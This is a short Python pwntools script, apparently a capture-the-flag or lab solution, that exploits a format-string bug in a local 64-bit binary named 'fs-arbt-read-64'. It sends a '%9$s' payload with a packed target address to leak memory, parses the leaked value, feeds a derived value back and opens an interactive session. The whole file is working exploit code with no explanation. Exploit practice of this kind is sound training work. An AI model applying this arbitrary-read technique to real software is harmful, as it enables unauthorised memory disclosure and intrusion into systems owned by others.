#!/usr/bin/env python
#!/usr/bin/env python
from pwn import *
while True:
        p = process('./fs-arbt-read-64')
        buf = '%9$sBBBB'
        buf += p64(0x60109c)
        print(buf)
        p.recv()
        p.sendline(buf)
        q = (p.readline())
        mystr = (str(hex(u64(q[-16:-8]))))
        mystr = '0x' + mystr[2:] + 'db'
        print(mystr)
        p.sendline(mystr[:10])
        p.interactive()
        p.close()
        break